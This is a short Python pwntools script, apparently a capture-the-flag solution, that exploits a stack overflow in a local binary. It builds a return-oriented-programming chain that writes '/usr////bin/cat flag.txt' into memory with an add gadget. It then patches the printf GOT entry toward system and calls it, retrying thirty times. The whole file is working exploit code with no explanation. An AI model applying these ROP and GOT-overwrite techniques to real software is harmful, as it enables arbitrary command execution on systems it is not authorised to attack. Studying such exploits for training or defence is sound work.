from pwn import *


for _ in range(30):
	r = process("./a.out")
	#gdb.attach(r)
	
	magic_gadget = 0x000000000040115c   # add    DWORD PTR [rbp-0x3d],ebx
	pop_rbx_rbp_x4_ret = 0x40122a
	pop_rdi_ret = 0x0000000000401233
	ret = 0x000000000040101a
	
	bss = 0x00404500        # "/usr////bin/cat flag.txt"
	
	main = 0x401176
	printf_got = 0x404018
	printf = 0x401060
	
	payload = p64(0)*3
	payload += p64(pop_rbx_rbp_x4_ret) + p64(0x7273752f) + p64(bss + 0x3d) + p64(0)*4
	payload += p64(magic_gadget)
	payload += p64(pop_rbx_rbp_x4_ret) + p64(0x2f2f2f2f) + p64(bss + 0x3d + 4) + p64(0)*4
	payload += p64(magic_gadget)
	payload += p64(pop_rbx_rbp_x4_ret) + p64(0x2f6e6962) + p64(bss + 0x3d + 8) + p64(0)*4
	payload += p64(magic_gadget)
	
	payload += p64(pop_rbx_rbp_x4_ret) + p64(0x20746163) + p64(bss + 0x3d + 12) + p64(0)*4
	payload += p64(magic_gadget)
	payload += p64(pop_rbx_rbp_x4_ret) + p64(0x67616c66) + p64(bss + 0x3d + 16) + p64(0)*4
	payload += p64(magic_gadget)
	payload += p64(pop_rbx_rbp_x4_ret) + p64(0x7478742e) + p64(bss + 0x3d + 20) + p64(0)*4
	payload += p64(magic_gadget)
	
	
	
	payload += p64(pop_rbx_rbp_x4_ret) + p64(0x6000000) + p64(printf_got + 0x3d - 2) + p64(0)*4
	payload += p64(magic_gadget)
	
	# system("cat flag.txt")
	payload += p64(ret) + p64(pop_rdi_ret) + p64(bss) + p64(printf)
	payload += p64(main)
	
	r.sendline(payload)
	
	
	print(r.recvall())
	r.close()